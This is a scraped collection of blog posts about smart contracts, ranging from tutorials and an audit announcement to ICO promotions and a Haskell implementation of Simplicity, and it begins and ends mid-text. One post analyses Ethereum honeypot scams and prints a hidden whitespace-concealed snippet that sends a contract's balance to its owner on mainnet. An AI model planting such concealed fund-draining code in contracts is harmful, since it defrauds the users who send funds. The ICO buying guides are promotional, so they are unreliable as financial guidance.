in\u00a0PragmaLet\u2019s mint 1000000\u00a0tokens!Signing the transactionYay!There you have it. Your first smart contract, deployed on blockchain.\u00a0:)A lot of new concepts were introduced along with a couple of amazingly helpful tools. It might be a little overwhelming, and that\u2019s okay! Just try to get your head around the concepts and then run with it.Have you created any simple but interesting smart contracts? Post them in the comments and I\u2019ll add them in the post for reference.Have questions? Add them in the comments or join our telegram group and talk to us directly.", "responses": "9"}, {"title": "The phenomenon of smart contract honeypots", "author_name": "Gerhard Wagner", "link": "https://medium.com/coinmonks/the-phenomena-of-smart-contract-honeypots-755c1f943f7b?source=search_post", "post_date": "Mar 20, 2018", "readtime": "7 min read", "upvotes": "741", "content": "The phenomenon of smart contract honeypotsGerhard WagnerBlockedUnblockFollowFollowingMar 20, 2018Hardly a week passes without large scale hacks in the crypto world. It\u2019s not just centralised exchanges that are targets of attackers. Successful hacks such as the DAO, Parity1 and Parity2 have shown that vulnerabilities in smart contracts can lead to losing digital assets worth millions of dollars. Attackers are driven by making profits and with the incredible value appreciation in 2017 in the crypto world, individuals and organisations who hold or manage digital assets are often vulnerable to attacks. Especially smart contracts have become a prime target for attackers for the following reasons:Finality of transactions: This is a special property of blockchain systems and it means that once a transaction (or state change) took place it can\u2019t be taken back or at least not with grave consequences which in case of the DAO hack led to a hard fork. For an attacker targeting smart contracts, finality is a great property since a successful attack can not easily be undone. In traditional banking systems this is quite different, an attack even though initially successful could be stopped and any transactions could be rolled back if noticed early enough.Monetising successful attacks is straight forward: Once the funds of a smart contract can be withdrawn to an attacker\u2019s account, transferring the funds to an exchange and cashing out in Fiat while concealing ones identity is something that the attackers can get away with if they are careful enough.Availability of contract source code / byte code: Ethereum is a public blockchain and so at least the byte code of a smart contract is available to anyone. Blockchain explorers such Etherscan allow also to attach source code to a smart contract and so giving access to high level Solidity code to potential attackers.Since we have established now why attackers find smart contracts attractive targets, let\u2019s further look into the circumstances that could decide if a smart contracts gets attacked:Balance: The greater the balance of a smart contract the more attackers will try to attack it and the more time they are willing to spend to find a vulnerability. This is an easier economic equation than for none smart contract targets since the balance that can be potentially stolen is public and attackers have certainty on how profitable a successful attack could be.Difficulty/Time: This is the unknown variable in the equation. Yet the approach to look for potential targets can be automated by using smart contract vulnerability scanners. Availability of source code addtionally decreases analyis time while also lowering the bar for potential attackers to hack smart contracts since byte code is harder to read and therefore it takes more skill and time to analyse.Taking the two factors above in consideration, one could assume that every smart contract published to the main net with a sufficient balance is analysed automatically by scanners or/and manually by humans for vulnerabilities and is likely going to be exploited if it is in fact vulnerable. The economic incentives and the availability of smart contracts on the public chain have given rise to a very active group attackers, trying to steal from vulnerable smart contracts. Among this larger group of attackers, a few seem to have specialised to hack the hackers by creating seemingly vulnerable smart contracts. In many ways these contracts have resemblance to honeypot systems. They are created to lure attackers with the following properties:Balance: Honeypots are created with an initial balance that often seem to be in the range of 0.5\u20131.0 ETH.Vulnerability: A weakness in the code that seemingly allows an attacker to withdraw all the funds.Recovery Mechanism: Allows owner to reclaim the funds including the funds of the attacker.Let\u2019s analyse three different types of smart contract honeypots that I have come across over the last couple of weeks.honeypot1: MultiplicatorX3The contract\u2019s source code was published on Etherscan with a seemingly vulnerable function. Try to spot the trap.Analyses (!Spoiler!):This is a really a short contract and the multiplicate() function is the only function that does allow a call from anyone else than the owner of the contract. At first glance it looks like by transferring more than the current balance of the contract it is possible to withdraw the full balance. Both statements in line 29 and 31 try to reinforce the idea that this.balance is somehow credited after the function is finished. This is a trap since the this.balance is updated before the multiplicate() function is called and so if(msg.value>=this.balance) is never true unless this.balance is initially zero.It seems that someone has actually tried to call multiplicate() with 1.1 Ether. Shortly after the owner has withdrawn the full balance.honeypot2: Gift_1_ETHThe contract has a promising name, if you want to figure out the trap yourself have a look at the code here. Also check out the transaction log\u00a0\u2026 why did 0xc4126a64c546677146FfB3f3D5A6F6d5A2F94DF1 lose 1 ETH?Analyses (!Spoiler!):It seems that 0xc4126a64c546677146FfB3f3D5A6F6d5A2F94DF1 did everything right. First SetPass() was called to overwrite hashPass and then GetGift() to withdraw the Ether. Also the attacker made sure PassHasBeenSet() has not been called. So what went wrong?One important piece of information in order to understand honeypot2 is to clarify what internal transactions are. They actually do not exist according to the specifications in the Ethereum Yellow Paper (see Appendix A for terminologies). Transactions can only be sent by External Actors to other External Actors or non-empty associated EVM Code accounts or what is commonly referred to as smart contracts. If smart contracts exchange value between each other then they perform a Message Call not a Transaction. The terminology used by EtherScan and other blockchain explorers can be misleading.It\u2019s interesting how one takes information as a given truth if the data comes from a familiar source. In this case EtherScan does not show the full picture of what happened. The assumption is that the transaction (or message call) should show up in internal transactions tab but it seems that calls from other contracts that have msg.value set to zero are not listed currently. Etherchain on the other hand shows the transaction (or message call) that called PassHasBeenSet() with the correct hash and so denying any future password reset. The attacker (in this case more of a victim) could have also been more careful and actually read the contract storage with Mythril for instance. It would have been apparent that passHasBeenSet is already set to true.honeypot3: TestTokenI have taken the trick from the honeypot contract WhaleGiveaway1 (see analysis) and combined it with one of my own ideas. The contract is available here on my Github. Something is missing here\u00a0\u2026Analyses (!Spoiler!):This contract relies on a very simple yet effective technique. It uses a lot of whitespaces to push some of the code to the right and out of the immediate visibility of the editor if horizontal scrolling is enabled (WhaleGiveaway1). When you try this locally in Remix and you purely rely on the scrolling technique like in WhaleGiveaway1 then the trick actually does not work. It would be effective if an attacker copies the code and is actually able to exploit the issue locally but then fails on the main net. This can be done using block numbers. Based on what network is used the block numbers vary significantly from the main net.Ganache: starts from 0Testrpc: starts from 1150000Ropsten: a few weeks ago around 2596174Main net: a few weeks ago around 5040270Therefore the first if statement is only true on the main net and transfers all ETH to the owner. On the other networks the \u201cinvisible\u201d code is not executed.if (block.number > 5040270 ) {if (_owner == msg.sender ){_owner.transfer(this.balance);} else {throw;}}EtherScan also had the horizontal scrolling enabled, but they deactivated it a few a few weeks ago.TL;DRSmart contract honeypot authors form a very interesting sub culture among a larger group of hackers trying to profit from vulnerable smart contracts. In general I would like to give anyone the following advice:Be careful where you send your ETH, it could be a trap.Be nice and don\u2019t steal from people.I have created a Github repo for honeypot smart contracts here. Should you have any honey pot contracts yourself that you want to share please feel free to push them to the repo or share them in the comments.", "responses": "2"}, {"title": "ConsenSys Diligence concludes first Brickblock smart contract\u00a0audit", "author_name": "Brickblock.io", "link": "https://blog.brickblock.io/consensys-diligence-concludes-first-brickblock-smart-contract-audit-d841ef96eae0?source=search_post", "post_date": "Mar 22, 2018", "readtime": "2 min read", "upvotes": "618", "content": "ConsenSys Diligence concludes first Brickblock smart contract\u00a0auditBrickblock.ioBlockedUnblockFollowFollowingMar 22, 2018UPDATE (Sept. 2018): ConsenSys Diligence has successfully audited our full smart contract ecosystem. You can view the results of the audit here.Earlier this month we shared news that Diligence, a ConsenSys formation, will audit our full smart contract ecosystem.Working with a company at the forefront of the blockchain space allows us to further improve the efficiency and security of our smart contracts.We recently received the results of ConsenSys Diligence\u2019s first audit. The audit was conducted to ensure the security, architecture, and code correctness and quality of our BrickblockToken (BBK) and CustomPOAToken contracts.The CustomPOA contract is the one we\u2019ll be using to facilitate the sale of the world\u2019s first tokenized real estate asset.The resultConsenSys Diligence determined that there were no critical or major findings for neither the BrickblockToken nor the CustomPOAToken smart contract. Furthermore, medium and minor findings were addressed by our development team in close collaboration with the auditing party\u2019s lead engineer.A second and final report acknowledged that our development team has addressed all findings from the initial audit.The two remaining \u201cmedium\u201d issues are deliberate decisions and don\u2019t expose users to any risk:\u201cExplicit lack of trustlessness\u201d\u00a0This was a conscious decision on account of requiring an emergency plan to not risk users\u2019 funds in the unlikely event of smart contract issues during our first sale.\u201cNon-optimal handling of excess Ether in contributions in CustomPOAToken\u201d\u00a0This was a joint decision with ConsenSys Diligence engineers. Due to integer division, there can be miniscule amounts of \u201cdust\u201d remaining in the contract (fractions of a cent). Completely eradicating this \u201cdust\u201d would have led to adding a significant amount of complexity to our system that could have introduced new bugs or vulnerabilities. We therefore decided against doing so.ConsenSys Diligence will continue to audit Brickblock\u2019s full smart contract ecosystem. We will publish results as they become available.", "responses": "1"}, {"title": "I Just Wrote a Stellar Smart Contract Pt. 2: Let\u2019s Dig a Little\u00a0Deeper", "author_name": "Robert Durst", "link": "https://hackernoon.com/i-just-wrote-a-stellar-smart-contract-pt-2-lets-dive-a-little-deeper-a8dae19b9d0a?source=search_post", "post_date": "Apr 7, 2018", "readtime": "7 min read", "upvotes": "914", "content": "I Just Wrote a Stellar Smart Contract Pt. 2: Let\u2019s Dig a Little\u00a0DeeperRobert DurstBlockedUnblockFollowFollowingApr 7, 2018A little over a month ago, I wrote part 1 of this multi-part series, detailing my journey into the world of Stellar Smart Contracts (SSC\u2019s).Since then, I have received some wonderful feedback, compliments, doubts, concerns, etc.Many of these concerns were valid and today, with a completely free schedule, a warm cup of coffee, and a fully-charged computer, I sat down and looked to build off of the basics I described in pt. 1.", "responses": "8"}, {"title": "Snopes meets Mechanical Turk: Announcing Reality Check, a crowd-sourced smart contract\u00a0oracle", "author_name": "Edmund Edgar", "link": "https://medium.com/@edmundedgar/snopes-meets-mechanical-turk-announcing-reality-check-a-crowd-sourced-smart-contract-oracle-551d03468177?source=search_post", "post_date": "Oct 10, 2017", "readtime": "3 min read", "upvotes": "619", "content": "Snopes meets Mechanical Turk: Announcing Reality Check, a crowd-sourced smart contract\u00a0oracleEdmund EdgarBlockedUnblockFollowFollowingOct 10, 2017When we started building the Reality Keys smart contract oracle in 2013, we assumed that most of the data people would want would be able to be pulled from existing data feed APIs.But in practice we found that a lot of the most interesting things people wanted data for didn\u2019t have reliable, trustworthy existing feeds that gave them exactly what they wanted. And where people have tried to use data feeds directly from the web, it has often worked out badly for them.What we really wanted was the ability to just ask an arbitrary question, whether it\u2019s about a sports result, a house burning down, or a smart contract having a critical bug in it that justifies letting the original developers back in.At the same time, the world is fretting about Fake News, and the web in general is going through something of a crisis when it comes to judging the legitimacy of information. The smart contract ecosystem, with its easily created self-governing processes and organizations, seems like it has some potential to help, if we can give these contracts a concrete problem to cut their teeth on, and a way to pay them if they do it right.In particular I wanted a place to experiment with Subjectivocracy. I discuss the concept of a Subjectivocratic oracle system my previous piece, Get the facts: Hard-fork all the things.So we\u2019ve built Reality Check, a system that crowd-sources the answering of arbitrary questions asked by humans or contracts. Our goals were as follows:You or your contract can ask a question and get an answer to it.People who give the right answer make profits.People who give the wrong answer make losses.Gas costs are reasonably low, particularly for correcting false information.Resolution is cheap and reasonably fast for the typical case.Resource-intensive resolution processes are possible, and are funded by people who are wrong.The system for arbitration\u200a\u2014\u200athe final word about what is true\u200a\u2014\u200acan be chosen freely and easily switched. You can use something centralized, distributed or experimental-game-theoretical.There is a detailed explanation in our documentation, but here\u2019s how it works:Rewards are offered for answering questions, but when you answer the question you must post a bond. To contradict a previous answer, you have to double the bond. Answerers keep doubling until one of them gives up, and the final answer is considered correct, unless someone pays a fee to the arbitrator contract, in which case the arbitrator\u2019s decision will stand.The arbitrator can be any contract you choose. Reality Keys provide a trusted arbitrator contract, which simply provides our own opinion on what happened. We say a bit about other models here.If you gave the accepted answer, you get to scoop up the initial reward, plus any bonds from people before you who gave a different answer.Reality Check is now live on the Rinkeby testnet. We built a Dapp to try it with. Go ahead and play with it, and let us know what you think.If you have questions or comments, feel free to post them below or come and talk to us in our Gitter channel.", "responses": "2"}, {"title": "How I become Blockchain developer and Smart contract\u00a0hacker", "author_name": "Il Kadyrov", "link": "https://hackernoon.com/how-i-become-blockchain-developer-and-smart-contract-hacker-14f7608e743a?source=search_post", "post_date": "Jul 12, 2018", "readtime": "5 min read", "upvotes": "1.7K", "content": "How I become Blockchain developer and Smart contract\u00a0hackerHalf a year to become middle smart contract\u00a0hackerIl KadyrovBlockedUnblockFollowFollowingJul 12, 2018My first\u00a0failFor about two years I were a freelance Android developer and studied Machine Learning and Neural Networks. At the end of 2017 I decided to become Data Scientist or Blockchain Developer and put my CV on some hiring services and continued working as Android developer. At the same time I started learning blockchain and trading, so we created telegram channel with my friend where we shared review of blockchain projects with some score and predict(like a lot of rating agencies now). I had a goal to finish my Android project at the end of December and to start searching some Blockchain related work at the beginning of 2018. However, at the first week of December I got a call from Sberbank Technologies for an interview and agreed. I understood that I know nothing about Ethereum, Neo, Bitcoin, details of their blockchains, about smart contracts etc. I had a couple of days at my disposal and started preparing for interview. During three days i passed a course about developing Ethereum smart contracts, read Ethereum docs, wrote few smart contracts, deployed them on testnet, developed for them UI and connect with web3js, read a lot of info about Ethereum and Neo, about their blockchains comparison and went to the interview. Of course, I failed this interview because of having no experience in blockchain. But it was very important for me to try my hands. After this failing I decided to finish my Android project as soon as possible and to start learning Blockchain. At the end of December Android app was finished.Blockchain developer careerLove blockchain, trust Blockchain, build Blockchain!HashExIn January I started to learn solidity, developed few simple projects, visited few meetups and at the end of January got job at HashEx team. I worked there as Blockchain developer and Smart Contract hacker. During period worked there I got a lot of experience in auditing smart contracts on Ethereum and Neo (Best of which are: WePower, INS Ecosystem, Arcona Augmented Reality Ecosystem), also participated in developing HDKeys library, built few blockchain-related services, participated in building online shop with crypto payments. I left HashEx at May and started looking for new projects where I could grow up as a Blockchain developer, but before that we travelled to Germany with my friend and received a portion of motivation.Callisto NetworkIn May I had few interviews and got two offers, one of which was from Callisto Network as Smart Contract hacker. Of course, for me Callisto looks better and more interesting than others because their CEO Dexaran works on Ethereum Classic and has big experience in Blockchain. Also I wanna become good smart contract hacker, because if you want to write good contracts you must undertsand how you can hack them, and this also influenced my decision\u00a0. It was too easy to do good audit report for dice game smart contract and after few weeks I were accepted as middle smart contract hacker.ICORatingAt the beginning of June I got an offer from ICORating\u200a\u2014\u200aleading rating agency that issues independent analytical research, evaluating ICO projects and assigning them ratings. In simple words it\u2019s one of the biggest rating agency in Blockchain. Of course I agreed and started working as Technical Blockchain Analyst and Smart Contract hacker. Blockchain is too interesting and too complicated. There are a lot of people who wanna just make money, also a lot of people who manipulate the market, and of course a lot of people who wanna make the world better by integrating Blockchain to real business. We are the ones, who wanna make blockchain more transparent and better. I\u2019m doing technical reports for ICO projects and auditing their smart contracts and MVP. So I forced to read all their technical documents, look through their code and analyse in which stage their development is now, how development process is going, will the team do all services as they wrote in their roadmap, etc. For me it\u2019s too interesting, I began to understand more and more projects\u2019 ideas and how to develop similar projects, began to do better audit reports, my experience is growing and I become more professional. As much I analyse so much more I can predict usability of project in future. For now it\u2019s the best place for me.What comes\u00a0next?Few days ago I analyse my last 6 months. In January I decided to write goals for this 2018 year. For now I completed just few of them, but when I saw all experience got in this year, I understand it\u2019s too much. And now I have lot of goals to do and half a year at my disposal.Some of this goals.Read 30 booksVisit Germany, Italy, Finland, Estonia, Romania, CanadaLive 60 days in EuropeVisit 50+ meetups, conferencesImprove my TurkishWrite 40+ articles in MediumBecome Senior Technical Blockchain AnalystAnd few more goals.Just do\u00a0it!I understand for myself \u2014we are not living in the box and don\u2019t have any limits. We can do all we want. Everything depends on us. Work hard everyday and you will get your result. There are a lot of motivational videos and posts on the internet, but the main thing you must understand is results will come just after hard working, not after watching this videos or reading this motivational stories about other people!SummaryLife is too short and each day has its own beauty and value. You will fail in some ways, you will win, but the main goal is to see the life around us. Becoming the best is very hard but at the same time it\u2019s very engrossing way which will make your life like a dream. Appreciate it!", "responses": "3"}, {"title": "What is a smart contract and how does it work in our AIDA\u00a0service.", "author_name": "Aida Service", "link": "https://medium.com/@aidaservice/what-is-a-smart-contract-and-how-does-it-work-in-our-aida-service-a7d7a2a6eeaa?source=search_post", "post_date": "Dec 24, 2017", "readtime": "4 min read", "upvotes": "174", "content": "What is a smart contract and how does it work in our AIDA\u00a0service.Aida ServiceBlockedUnblockFollowFollowingDec 24, 2017The idea of \u200b\u200ba smart contract came back in 1994 to Nick Szabo. He is an expert in law and a cryptographer, he understood that it is possible to conclude \u201csmart contracts\u201d on the basis of a decentralized registry. But then there was no suitable platform, so that it could be translated into reality. However, the situation changed in 2008, when the block chain technology appeared.In turn, Block chain is the technology that the whole world is talking about. Information on a block chain technology is recorded in an encrypted form and distributed to all computers on the network. Each new block contains information about the previous one, which leads to the reliability of the circuit and in order to write information to the block, it is necessary to sign the action with a unique private key. This ensures that no one will enter information on your behalf and without your knowledge.That is, in simple terms, a smart contract is a computer algorithm designed to conclude and maintain self-executing contracts performed in a block chain environment.Due to the fact that smart contracts operate on the basis of a block chain, they give confidence to their users in the reliability and confidentiality of transactions where outsiders do not participate, whether it is government bodies or banks. That is any actions / transactions carried out on the basis of a smart contract and they are traceable, transparent and irreversible.However, smart contracts received wide practical application with the appearance and development of the Ethereum project. When its founder Vitalik Buterin in 2013 came to the conclusion that bitcoin is poorly suited as a basic protocol for smart contracts, since it was not originally designed for this task. Subsequently, Mr. Buterin decided to create from scratch the most suitable protocol for smart contracts.And our smart contract AID token is structured upon ERC20 standard\u00a0.Aida-Market/AIDA_ICO_SmartContractContribute to AIDA_ICO_SmartContract development by creating an account on GitHub.github.comA distinctive feature of our contract is that the price of the token is fixed in USD and not in Ethereum, which avoids the risks of the volatility of the Ethereum rate for investors.This technical feature is made possible by usage of Oracle, a platform that brings up setRate every 30 minutes, which in turn transmits ETH/USD actual exchange rate of five top cryptocurrency exchanges as a parameter of the smart-contract. The token price is set to $0.25 apiece.In addition to deposits in Ethereum, participants of the crowdfunding will be able to purchase AID tokens for BTC, LTC, BCC and USD (from debit cards). Payment processing in these currencies will occur through the use of an automated platform that calculates the size of each incoming transaction in the USD equivalent, tracks the number of transaction confirmations and once the transaction is confirmed, produces the tokens on the Ethereum address, which was indicated by investor in the private account.Issue of tokens is made by bringing up the (buyForInvestor) method,\u200a\u2014\u200aof buying a token for other crypto-currencies-BTC, LTC, BCC directly from cotroller-addresses. To ensure the release of tokens in real time, a unique design principle (sharded) developed by Phenom (https://phenom.team) is used, when the entire release process is distributed simultaneously between the three controller addresses, which allows real-time production of tokens, even in cases of congestion of the Ethereum network.The ICO process is divided into two\u00a0stages:1. Preliminary sale of tokens to participants of the crowd sale (Pre-ICO)\u00a0\u25cb Terms: 04.01.18 09:00:00 UTC+6\u201327.02.18 23:59:59 UTC+6\u00a0\u00a0\u25cb During this stage tokens are sold with 15% bonus.2. Main stage of the ICO\u00a0\u25cb Terms: 28.02.18 00:00:00 UTC+6\u201325.05.18 00:00:00 UTC+6\u00a0Bonuses: 27.02.18\u201325.03.18\u201310; 26.03.18\u201325.04.18\u20135%.AidaIco is the first smart-contract which is structured and based upon the concept outlined by Vitalik Buterin. Where during of the crowdsdale, participants are given the opportunity to return the deposited funds 1 time:Everybody who deposited funds in ICO in case of untrust may return his funds. The process of return will launch function which forward deposited funds to the crowdsale participant to his wallet. In this case all returned tokens will be burned. The funds are get returned back to the wallet of crowdsale participant, minus transaction fee.Our company decide to use a smart contract, because we are convinced that contractual relations can be partially or even completely self-governing. The cryptography that underlies the smart contract, provides a higher level of security than traditional contracts.Interactive smart contract\u00a0schemeTherefore, our goal is to provide a better, new, modern and innovative service.For more technical information about smart contract please visit our website https://ico.aida.market/.", "responses": ""}, {"title": "Q&A Session with Rob Peterson x Bee Token Smart Contract\u00a0Engineer", "author_name": "The Bee Token", "link": "https://medium.com/@thebeetoken/q-a-session-with-rob-peterson-x-bee-token-smart-contract-engineer-c1713b01c49f?source=search_post", "post_date": "Jan 13, 2018", "readtime": "2 min read", "upvotes": "833", "content": "Q&A Session with Rob Peterson x Bee Token Smart Contract\u00a0EngineerThe Bee TokenBlockedUnblockFollowFollowingJan 13, 2018January 13th, 2018We are pleased to introduce you to our brave and valiant smart contract engineer Rob Peterson!Question: What made you want to join the Bee Token?The team. Not only do I have the opportunity to work alongside a group of all-star engineers, but I\u2019m able to have a strong influence on the direction and design of our protocols and vision. Everyone is strong, humble, and willing to share and listen to feedback.Question: How did you hear about the Bee Token?CEO Jon Chou asked me to help him out by writing smart contracts for a home sharing token, which piqued my interest. He invited me to their first team meeting, and I was sold after meeting everyone and discussing the project.Question: What is the normal workday like for you?I code/research for a couple hours before heading into the office. Once I\u2019m there, I deal with any pressing issues from coworkers, sync on daily tasks, attend meetings, answer emails, and write code.Question: Where do you see the Bee Token in 1 year? 3 years? 5 years?Year one should be the most exciting for Bee Token as we finish developing our protocols and application. I see us exceeding our roadmap goals in the first three years. It\u2019s difficult to predict five years out, since vast infrastructure changes need to be made before we get there. We\u2019ve partnered with some amazing projects so far, and I can easily see our protocols being used by a wide variety of sharing economy applications.Question: What do you do for fun when not working on the Bee Token?Bee Token is my life.Question: Do you have any hidden talents?They will remain hidden\u00a0;)Question: What\u2019s the worst job you ever had? Why?I was hired for a sales/marketing/management job when I was 18 where my employer asked me to lie to the customers. Needless to say, I resigned quickly.Question: What\u2019s your dream car?I don\u2019t have one.Links:www.thebeetoken.comfacebook.com/thebeetokeninstagram.com/thebeetokentwitter.com/thebeetokenhttps://t.me/beetokenhttps://www.reddit.com/r/beetoken/http://steemit.com/@thebeetokenEmail: team@thebeetoken.com", "responses": "6"}, {"title": "How to buy SAT using Smart Contract with MyEtherWallet (MEW)", "author_name": "Sphere Official", "link": "https://medium.com/@sphereofficial/how-to-buy-sat-using-smart-contract-with-myetherwallet-mew-c4a960da9b13?source=search_post", "post_date": "Feb 13, 2018", "readtime": "3 min read", "upvotes": "524", "content": "How to buy SAT using Smart Contract with MyEtherWallet (MEW)Sphere OfficialBlockedUnblockFollowFollowingFeb 13, 2018We are creating this comprehensive guide for those who have questions about how to buy SAT using our Smart Contract with MEW.Be advised that we highly recommend Metamask if you are not sure what you are doing. Sphere takes no responsibility for your actions.Do not send ETH from an exchange to the smart contract. Your ETH will disappear forever.You can send ETH from any ERC20 compatible wallet like MyEtherWallet, Metamask, Parity or MIST.Set gas limit to 200,000 GAS and 40 GWEI GAS PRICEOur SAT Smart contract address: 0xc56b13ebbCFfa67cFb7979b900b736b3fb480D78Symbol: SATDecimals: 8Instructions to buy SAT with MyEtherWallet (MEW)Sign in to your Sphere Backoffice Account2. Click on \u201cBUY (SMART CONTRACT)\u201d3. Copy the Smart Contract Address 0xc56b13ebbCFfa67cFb7979b900b736b3fb480D784. Unlock your MyEtherWallet account and go to the \u201cSend Ether and Tokens\u201d on the menu5. Paste the Smart Contract Address copied from the Sphere Backoffice to the Field \u201cTo Address\u201d6. Enter the amount of ETH you want to send. Make sure it is set to ETH.7. Set Gas Limit to 2000008. Click on \u201cGenerate Transaction\u201d9. Make sure everything is correct then, click on \u201cSend Transaction\u201d10. Verify that the Send To Address is 0xc56b13ebbCFfa67cFb7979b900b736b3fb480D7811. Click on \u201cYes, I am sure! Make transaction\u201d to start the transfer process12. You can check you Transaction status using these buttons \u201cVerify Transaction\u201d and \u201cCheck TX Status\u201dAdding SAT to MyEtherWallet13. Next Click on \u201cAdd Custom Token\u201d14. Enter the Smart Contract Address 0xc56b13ebbCFfa67cFb7979b900b736b3fb480D78 in the \u201cToken Contract Address\u201d field15. Enter \u201cSAT\u201d for \u201cToken Symbol\u201d field16. Enter \u201c8\u201d in \u201cDecimals\u201d field17. Click \u201cSave\u201d18. Congratulations you successfully received SAT in your walletFor those who bought SAT during pre-sale, rewards from bounty, and through any methods of payments other than the smart contract. You will receive your SAT after the ICO in April.", "responses": "3"}, {"title": "Understanding Simplicity: implementing a smart contract language in 30 lines of\u00a0Haskell", "author_name": "Dan Robinson", "link": "https://medium.com/@danrobinson/understanding-simplicity-implementing-a-smart-contract-language-in-30-lines-of-haskell-827521bfeb4d?source=search_post", "post_date": "Dec 20, 2017", "readtime": "10 min read", "upvotes": "626", "content": "An online REPL for core Simplicity, using only the code from this\u00a0postUnderstanding Simplicity: implementing a smart contract language in 30 lines of\u00a0HaskellDan RobinsonBlockedUnblockFollowFollowingDec 20, 2017Last Monday, Chain released our open-source smart contract language for Bitcoin, Ivy. Ivy is a higher-level language that can compile to Bitcoin Script, the low-level language used by the Bitcoin protocol to determine whether a transaction is authorized. Ivy makes it easier for humans to read, write, and use Bitcoin smart contracts. But since it is designed to be compatible with Bitcoin today, its features are limited by the current capabilities of Bitcoin\u2019s virtual machine.What if those limits could be expanded? What if it were possible to get almost all of the safety, simplicity, and efficiency of a small, non-Turing-complete execution language like Bitcoin Script, while gaining much of the flexibility and power of a more expressive programming language?For this post, we\u2019re going to take a peek at a distant possible future of the Bitcoin protocol, in the form of an exciting paper from Russell O\u2019Connor of Blockstream. O\u2019Connor\u2019s paper proposes a possible replacement for Bitcoin Script, called Simplicity. Like Bitcoin Script, Simplicity is a low-level execution language, intended to be a compilation target for higher-level languages like Ivy. (To learn more about the possible advantages of Simplicity over Bitcoin Script and alternative low-level languages, you can see Blockstream\u2019s announcement, or this review from Philip Wadler.)O\u2019Connor\u2019s paper lays out everything you need to implement a Simplicity interpreter, but doesn\u2019t provide an executable reference implementation (although he is working to release an SDK in the near future). And following along with the paper can be a little daunting if, like me, you\u2019re not very familiar with the syntax of Coq or sequent calculus.This post attempts to address both these issues, by demonstrating how to implement core Simplicity using Haskell. Our implementation will use only elementary Haskell\u200a\u2014\u200aspecifically, material from chapters 2, 4, 7, and 11 of Haskell Programming from First Principles. If you\u2019ve ever used Haskell or another functional language like Elm, F#, PureScript, or OCaml, you\u2019ll probably be able to follow along.You can try out this implementation of Simplicity in your browser, and see the full code, at https://repl.it/@danrobinson/core-simplicity.In future posts, I might take a look at implementing some of the other features of Simplicity, embedding Simplicity in a less hospitable (but more popular) language, and even building part of a compiler from Ivy to Simplicity.GoalsWe\u2019ll be implementing core Simplicity as a Haskell module. This module exports functions that allows you to write and execute Simplicity expressions as Haskell code, with almost no translation. For example, this Simplicity program from section 2.5 of the paper:Can be translated into the following Haskell code:not :: Bit -> Bitnot = comp (pair iden unit) (match (injr unit) (injl unit))Our implementation will be a shallow embedding. This means every Simplicity combinator and expression will correspond to a Haskell function, and every Simplicity value will correspond to a Haskell value. This allows us to piggyback on Haskell\u2019s AST, as well as its type inference and type checker. If an expression is a valid Haskell expression, we know it is also a valid Simplicity expression.In this post, we\u2019ll only implement the nine basic combinators of core Simplicity (described in section 2 of O\u2019Connor\u2019s paper). We won\u2019t touch the more sophisticated features of Simplicity, such as sub-expression sharing, merklized abstract syntax trees, and jets.Types and\u00a0valuesSimplicity has a unit type, \ud835\udfd9. (A \u201cunit type\u201d means a type with only one inhabitant.) To represent this type, we will use Haskell\u2019s built-in unit type, () (pronounced \u201cunit\u201d).In Simplicity, the sole value of the unit type looks like \u27e8\u27e9. In Haskell, the value has the same name as the type itself, ().Simplicity also has sum types, written A + B, where A and B are other Simplicity types. Each inhabitant of this type is a value of either type A or B, along with a tag indicating whether it is from the left or the right type. For sum types, we will use Haskell\u2019s canonical sum type, Either, which is defined as data Either a b = Left a | Right b.In Simplicity, the values of this type look like \u03c3\u1d38(a) (when the contained value is a value of the first type, type A) or \u03c3\u1d3f(b) (when the contained value is a value of the second type, type B). In Haskell, they look like Left a and Right b. For example, the two values that inhabit type Either () () are Left () and Right (). The three inhabitants of type Either (Either () ()) () are Left (Left ()), Left (Right ()), and Right ().Finally, Simplicity has product types, written A x B. Each inhabitant of such a type is a pair of values\u200a\u2014\u200aone of type A, and one of type B. We will use Haskell\u2019s built-in tuple type, (a, b).In Simplicity, values of a product type look like \u27e8a, b\u27e9. In Haskell, they look like (a, b). For example, the four inhabitants of type (Either () (), Either () ()) are (Left (), Left ()), (Left (), Right ()), (Right (), Left ()), and (Right (), Right ()).Unlike in Haskell, sum and product types cannot be defined recursively. This means that every Simplicity type has a fixed, finite number of possible inhabitants.Numbers and\u00a0stringsYou\u2019ll notice that Simplicity does not have any built-in support for common primitive types like booleans, integers, or strings. Instead, the Simplicity paper defines such types as combinations of the types described above.For example, the paper defines a \u201cbit\u201d\u200a\u2014\u200aa type with two inhabitants, zero and one\u200a\u2014\u200aas the sum type \ud835\udfd9 + \ud835\udfd9. In Haskell, this corresponds to the type Either () (), and the two values of it are Left () and Right (). Following the convention used in the paper, we will define these values to mean 0 and 1, respectively.For our convenience, we can define Bit as a type synonym, along with more descriptive names for its two inhabitants:type Bit = Either () ()zero :: Bitzero = Left ()one :: Bitone = Right ()What if we want to represent not just one bit, but a two-bit \u201cword\u201d\u200a\u2014\u200asomething that can represent any number from 0 to 3? We can take a product type of two bits, (Bit, Bit).type Word2 = (Bit, Bit)This type can have 4 possible values: (zero, zero), (zero, one), (one, zero), and (one, one). We can interpret these as the integers 0, 1, 2, and 3, respectively. Alternatively, we could interpret them as bitstrings of length 2.The Simplicity paper defines larger word sizes as products of two smaller word size types. A 4-bit word is defined as the product of two 2-bit words, an 8-bit word is defined as the product of two 4-bit words, and so on.type Word4 = (Word2, Word2)type Word8 = (Word4, Word4)Expressions and combinatorsA Simplicity \u201cexpression\u201d is a function from one Simplicity value to another. This is a little unusual\u200a\u2014\u200ayou\u2019re probably accustomed to expressions that can evaluate to single values. (Simplicity also does not have first-class functions\u200a\u2014\u200aSimplicity expressions are not themselves Simplicity values.)Simplicity expressions look like this:pair iden unittake (take iden)comp (pair iden unit) (case (injr unit) (injl unit))Simplicity expressions are composed of combinators. A combinator is a primitive in Simplicity that turns 0 or more expressions into a new expression. There are only nine combinators in core Simplicity.iden :: a -> aiden a = aThe iden combinator is not parameterized with any other expressions\u200a\u2014\u200aiden by itself is a valid Simplicity expression. The expression iden is a function that takes a Simplicity value and returns the same value.unit :: a -> ()unit _ = ()The unit combinator, similarly, does not take any other expressions. unit is a function that ignores its input and returns a single value of type unit, ().comp :: (a -> b) -> (b -> c) -> a -> ccomp s t a = t (s a)The comp combinator takes two expressions, s and t. Remember, each of these expressions is itself a function from one Simplicity value to another. When partially applied to s and t, comp returns an new expression that takes some value a, applies the s expression to it, and then applies the t expression to that result.Note that the last argument to comp, a, is a Simplicity value. In contrast, all of the previous arguments are Simplicity expressions (i.e., Haskell functions). Because of 